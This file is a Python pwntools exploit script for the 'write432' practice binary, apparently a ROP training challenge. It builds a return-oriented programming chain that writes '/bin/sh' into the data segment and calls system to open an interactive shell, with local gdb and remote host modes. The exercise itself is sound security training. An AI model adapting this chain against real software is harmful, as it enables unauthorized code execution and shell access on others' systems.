#!/usr/bin/env python
from pwn import *
import sys

context.terminal = ['tmux','splitw','-h']

gdb_bool = True
#gdb_bool = False

def exploit(r):


    data_seg = 0x804a028
    ppr = 0x080486da #pop edi;pop ebp;ret
    mov_ebp_edi = 0x08048670 #mov [edi],ebp;ret
    system = 0x804865A

    r.recvuntil("> ")
    buf = ""
    buf += "A" * cyclic_find("laaa")
    buf += p32(ppr)
    buf += p32(data_seg)
    buf += "/bin"
    buf += p32(mov_ebp_edi)
    buf += p32(ppr)
    buf += p32(data_seg+4)
    buf += "/sh\x00"
    buf += p32(mov_ebp_edi) 
    buf += p32(system)
    buf += p32(data_seg)
    r.sendline(buf)
    r.interactive()
    return





if __name__ == "__main__":
    log.info("For remote %s HOST PORT" % sys.argv[0])
    
    binary_name = "./write432"        #put binary name here
    e = ELF(binary_name)

    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(binary_name)
        print util.proc.pidof(r)
        gdb_cmd = [
            "b *0x804864B",
            "c"


        ]
        if(gdb_bool):
            gdb.attach(r, gdbscript = "\n".join(gdb_cmd))
        #r = process("./LOLgame", env={"LD_PRELOAD" : "./libc.so.6.remote"})
        #pause()
        exploit(r)
